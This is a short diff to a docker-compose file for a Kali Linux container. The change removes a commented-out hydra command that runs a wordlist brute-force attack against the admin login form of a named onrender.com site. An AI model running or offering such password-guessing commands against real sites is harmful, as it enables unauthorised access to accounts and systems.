@@ -4,6 +4,4 @@ services:
     container_name: kali
     build: .
     tty: true
-# hydra -L ./wordlists/usernames/multiple_sources_users.txt -P ./wordlists/passwords/most_used_passwords.txt -v "https-post-form://autoprice-trust.onrender.com/admin/login/?next=/admin:username=^USER^&password=^PASS^:F=staff account"
-
-
+    
